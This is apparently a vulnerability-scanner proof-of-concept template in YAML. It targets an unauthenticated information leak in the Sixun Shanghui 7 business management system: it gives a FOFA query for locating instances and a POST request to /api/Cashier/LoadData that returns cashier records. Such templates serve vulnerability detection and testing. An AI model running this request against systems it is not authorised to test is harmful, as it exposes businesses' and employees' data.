id: poc-yaml-sixun-shanghui7-bms-loaddata-info-leak
info:
  name: 思迅商慧7商业管理系统 LoadData 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 思迅商慧7商业管理系统
  fofa: app="思迅商慧7商业管理系统"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"思迅商慧7商业管理系统")
- method: POST
  path: /api/Cashier/LoadData
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept: '*/*'
  data: loadAll=false&cashier_id=&gridFlag=CashierList&page=1&rows=60
  expression: status_code == 200 && contains(body,"\"cashier_status\":\"正常\"") &&
    contains(body,"\"cashier_status\":\"登录\"") && contains(body,"\"success\":true")
variables: {}
transport: http
